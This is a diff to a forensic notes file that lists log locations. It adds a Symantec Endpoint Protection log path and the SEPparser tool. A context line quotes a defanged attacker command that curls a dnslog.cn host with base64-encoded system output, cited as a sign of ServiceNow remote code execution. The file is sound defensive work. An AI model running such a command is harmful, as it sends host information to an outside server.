@@ -1594,6 +1594,10 @@ Common location for logs:
   
 - ServiceNow: `\\ServiceNow MID Server MID_Server_Prod\agent\logs\agent0.log.*`. Search for the following lines: `Dispatching event: 'MessageDispatchedEvent, message: Command <cmd>` which can show the commands being executed on servicenow especially due to remote code execution e.g. `curl hxxp://w2wlxu.dnslog.cn/?x=$(uname) -a|base64 -w0)`, as taken from [here](https://x.com/malmoeb/status/1814614969771544923)
 
+#### via ProgramData
+
+- Symantec Endpoint Protection: `C:\ProgramData\Symantec\Symantec Endpoint Protection\CurrentVersion\Data\Logs`: Leverage [SEParser](https://github.com/Beercow/SEPparser) to extract packets from Firewall Packet log, Parse ccSubSDK data into csv reports, Extract potential binary blobs from ccSubSDK, Parse VBN files into csv reports, etc.
+  
 #### via dir / C: / System32 logs
 
 ```
